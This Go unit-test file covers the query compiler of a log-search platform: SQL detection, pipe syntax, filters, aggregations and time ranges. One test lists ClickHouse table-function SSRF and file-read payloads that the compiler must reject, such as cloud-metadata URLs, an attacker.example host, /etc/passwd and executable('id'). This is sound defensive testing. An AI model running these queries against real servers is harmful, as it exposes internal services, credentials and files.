package planner

import (
	"strings"
	"testing"
	"time"

	"github.com/cairnobs/cairnobs/api/internal/querylang/ir"
)

var fixedNow = time.Date(2026, 8, 14, 12, 0, 0, 0, time.UTC)

func TestCompileDetectsSQL(t *testing.T) {
	plan, err := Compile(`SELECT * FROM logs LIMIT 10`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.RawSQL == "" {
		t.Fatalf("expected RawSQL to be set, got plan: %+v", plan)
	}
	if plan.RawSQL != "SELECT * FROM logs LIMIT 10" {
		t.Fatalf("RawSQL = %q", plan.RawSQL)
	}
}

func TestCompileDetectsSQLCaseInsensitive(t *testing.T) {
	plan, err := Compile(`select 1`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.RawSQL != "select 1" {
		t.Fatalf("RawSQL = %q", plan.RawSQL)
	}
}

func TestCompileRejectsNonSelectSQLKeyword(t *testing.T) {
	_, err := Compile(`DELETE FROM logs`, SQL, fixedNow)
	if err == nil {
		t.Fatal("expected an error for a non-SELECT statement forced to SQL language")
	}
}

// TestCompileRejectsSSRFTableFunctions guards against a real finding: a
// SELECT-only, keyword-blocklist check alone doesn't stop ClickHouse's
// built-in table functions, which let an otherwise-ordinary read-only
// SELECT make ClickHouse itself issue an outbound request (url,
// remote/remoteSecure, mysql, postgresql, s3, hdfs, ...) or read a local
// file (file) on the caller's behalf -- an SSRF/file-read primitive
// reachable by RoleViewer, the platform's lowest role.
func TestCompileRejectsSSRFTableFunctions(t *testing.T) {
	queries := []string{
		`SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'LineAsString', 's String')`,
		`select * from remote('internal-host:9000', system, tables)`,
		`SELECT * FROM remoteSecure('attacker.example:9440', db, tbl, 'user', 'pass')`,
		`select * from mysql('host:3306', 'db', 'table', 'user', 'pass')`,
		`SELECT * FROM postgresql('host:5432', 'db', 'table', 'user', 'pass')`,
		`select * from s3('https://bucket.s3.amazonaws.com/key', 'CSV')`,
		`SELECT * FROM hdfs('hdfs://host:9000/path', 'CSV')`,
		`select * from file('/etc/passwd', 'LineAsString')`,
		`SELECT * FROM odbc('DSN=foo', 'db', 'table')`,
		`select * from executable('id', 'TSV', 'x String')`,
		`SELECT * FROM cluster('some_cluster', system, tables)`,
	}
	for _, q := range queries {
		if _, err := Compile(q, SQL, fixedNow); err == nil {
			t.Errorf("expected Compile(%q) to reject a table-function SSRF vector, got no error", q)
		}
	}
}

// TestCompileAllowsOrdinaryColumnNamesResemblingTableFunctions makes
// sure the table-function blocklist only fires on actual function-call
// syntax (name immediately followed by "(") and not merely a column or
// identifier that happens to share a name with a blocked function.
func TestCompileAllowsOrdinaryColumnNamesResemblingTableFunctions(t *testing.T) {
	plan, err := Compile(`SELECT cluster_id, file_name FROM logs WHERE cluster_id = 1`, SQL, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.RawSQL == "" {
		t.Fatal("expected RawSQL to be set")
	}
}

func TestCompileExplicitLanguageOverridesAutoDetect(t *testing.T) {
	// "select" as a bare free-text search term -- would be misdetected
	// as SQL by the heuristic alone, hence the override.
	plan, err := Compile(`select`, SPL, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.RawSQL != "" {
		t.Fatalf("expected pipe-syntax compilation, got RawSQL = %q", plan.RawSQL)
	}
	if len(plan.TextSearch) != 1 || plan.TextSearch[0].Query != "select" {
		t.Fatalf("expected a free-text search for 'select', got %+v", plan.TextSearch)
	}
}

func TestCompileSimpleFilter(t *testing.T) {
	plan, err := Compile(`service=api`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	want := ir.FilterPredicate{Field: "service", Op: "=", Value: "api"}
	if len(plan.Filters) != 1 || plan.Filters[0] != want {
		t.Fatalf("unexpected filters: %+v, want [%+v]", plan.Filters, want)
	}
}

func TestCompileFullPipeline(t *testing.T) {
	plan, err := Compile(`service=api | where status>=500 | stats count by host | sort -count`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if len(plan.Filters) != 2 {
		t.Fatalf("expected 2 filters (service=api, status>=500), got %+v", plan.Filters)
	}
	if plan.Aggregation == nil || len(plan.Aggregation.Funcs) != 1 || plan.Aggregation.Funcs[0].Alias != "count" {
		t.Fatalf("unexpected aggregation: %+v", plan.Aggregation)
	}
	if len(plan.Aggregation.GroupBy) != 1 || plan.Aggregation.GroupBy[0] != "host" {
		t.Fatalf("unexpected group by: %+v", plan.Aggregation.GroupBy)
	}
	if len(plan.Sort) != 1 || plan.Sort[0].Field != "count" || !plan.Sort[0].Desc {
		t.Fatalf("unexpected sort: %+v", plan.Sort)
	}
}

func TestCompileTextSearchWithAggregation(t *testing.T) {
	plan, err := Compile(`message:"connection refused" | stats count by host`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if len(plan.TextSearch) != 1 || plan.TextSearch[0].Query != `"connection refused"` {
		t.Fatalf("unexpected text search: %+v", plan.TextSearch)
	}
	if plan.Aggregation == nil {
		t.Fatal("expected an aggregation")
	}
}

func TestCompileImplicitAndBetweenFreeTextTerms(t *testing.T) {
	plan, err := Compile(`error timeout`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if len(plan.TextSearch) != 1 {
		t.Fatalf("expected 1 combined text predicate, got %+v", plan.TextSearch)
	}
	if plan.TextSearch[0].Query != "error AND timeout" {
		t.Fatalf("Query = %q, want %q", plan.TextSearch[0].Query, "error AND timeout")
	}
}

func TestCompileOrBetweenFreeTextTerms(t *testing.T) {
	plan, err := Compile(`error or timeout`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.TextSearch[0].Query != "error OR timeout" {
		t.Fatalf("Query = %q, want %q", plan.TextSearch[0].Query, "error OR timeout")
	}
}

func TestCompileOrBetweenStructuredFiltersErrors(t *testing.T) {
	_, err := Compile(`service=api or service=web`, Auto, fixedNow)
	if err == nil {
		t.Fatal("expected an error: OR between structured filters isn't supported in Phase 2")
	}
	if !strings.Contains(err.Error(), "or") {
		t.Fatalf("error should mention 'or', got: %v", err)
	}
}

func TestCompileRelativeTimeBound(t *testing.T) {
	plan, err := Compile(`earliest=-1h`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.TimeRange == nil {
		t.Fatal("expected a TimeRange")
	}
	want := fixedNow.Add(-1 * time.Hour)
	if !plan.TimeRange.From.Equal(want) {
		t.Fatalf("From = %v, want %v", plan.TimeRange.From, want)
	}
}

func TestCompileAbsoluteTimeBound(t *testing.T) {
	plan, err := Compile(`latest="2026-08-14T00:00:00Z"`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	want := time.Date(2026, 8, 14, 0, 0, 0, 0, time.UTC)
	if !plan.TimeRange.To.Equal(want) {
		t.Fatalf("To = %v, want %v", plan.TimeRange.To, want)
	}
}

func TestCompileInvalidAbsoluteTimestampErrors(t *testing.T) {
	_, err := Compile(`latest="not-a-timestamp"`, Auto, fixedNow)
	if err == nil {
		t.Fatal("expected an error for an invalid absolute timestamp")
	}
}

func TestCompileSumWithoutFieldErrors(t *testing.T) {
	_, err := Compile(`service=api | stats sum`, Auto, fixedNow)
	if err == nil {
		t.Fatal("expected an error: sum() requires a field")
	}
}

func TestCompileAggAliasDefaultsAndCollisionIsDisambiguated(t *testing.T) {
	plan, err := Compile(`service=api | stats sum(a), sum(b)`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if len(plan.Aggregation.Funcs) != 2 {
		t.Fatalf("expected 2 agg funcs, got %+v", plan.Aggregation.Funcs)
	}
	if plan.Aggregation.Funcs[0].Alias == plan.Aggregation.Funcs[1].Alias {
		t.Fatalf("expected distinct aliases, got both %q", plan.Aggregation.Funcs[0].Alias)
	}
}

func TestCompileHeadDefaultsLimit(t *testing.T) {
	plan, err := Compile(`service=api | head`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.Limit == nil || plan.Limit.N != defaultLimit || plan.Limit.Tail {
		t.Fatalf("unexpected limit: %+v", plan.Limit)
	}
}

func TestCompileTailSetsTailFlag(t *testing.T) {
	plan, err := Compile(`service=api | tail 5`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if plan.Limit == nil || plan.Limit.N != 5 || !plan.Limit.Tail {
		t.Fatalf("unexpected limit: %+v", plan.Limit)
	}
}

func TestCompileFieldsProjection(t *testing.T) {
	plan, err := Compile(`service=api | fields host, message`, Auto, fixedNow)
	if err != nil {
		t.Fatalf("Compile() error = %v", err)
	}
	if len(plan.Fields) != 2 || plan.Fields[0] != "host" || plan.Fields[1] != "message" {
		t.Fatalf("unexpected fields: %+v", plan.Fields)
	}
}

func TestCompileParseErrorPropagates(t *testing.T) {
	_, err := Compile(`service=api | bogus`, Auto, fixedNow)
	if err == nil {
		t.Fatal("expected a parse error to propagate")
	}
}
